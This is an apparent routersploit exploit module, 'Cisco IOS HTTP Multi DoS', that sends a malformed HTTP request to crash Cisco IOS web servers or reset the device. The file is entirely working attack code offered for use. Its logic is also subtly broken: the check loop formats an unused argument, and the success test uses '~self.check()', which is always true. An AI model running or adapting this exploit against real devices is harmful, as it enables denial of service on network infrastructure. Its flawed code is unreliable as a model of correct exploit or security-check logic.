from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    print_status,
    http_request,
    mute,
    validators,
)

import re


class Exploit(exploits.Exploit):
    """
    I'm very hungry.
    With multi-payloads to exploit the IOS web server!
    """
    __info__ = {
        'name': 'Cisco IOS HTTP Multi DoS',
        'description': 'HTTP server for Cisco IOS Founded multi DoS vulnerable\n'
                       'Attacker can exploit this vulnerable, cause HTTP service\n'
                       'deny any request even make device reset.',
        'authors': [
            'BlackAngels' 
        ],
        'references': [
            'https://www.securityfocus.com/bid/4711/info',
        ],
        'devices': [
            'Cisco IOS with Web Server',
        ],
        'id': 'sf-4771-4'
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    payloads = '/\%\%'

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            url = "{}:{}/{}".format(self.target, self.port, self.payloads)
            response = http_request(method="GET", url=url)
            if response is None:
                if ~self.check():
                    print_success("Exploit success!")
                    return True
            else:
                print_error("Exploit Failed!")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        for num in range(16, 100):
            url = "{}:{}/".format(self.target, self.port, num)
            response = http_request(method="GET", url=url)
            if response is None:  # target does not respond
                break

            if response.status_code == 200:
                return True  # target is vulnerable

        return False  # target is not vulnerable
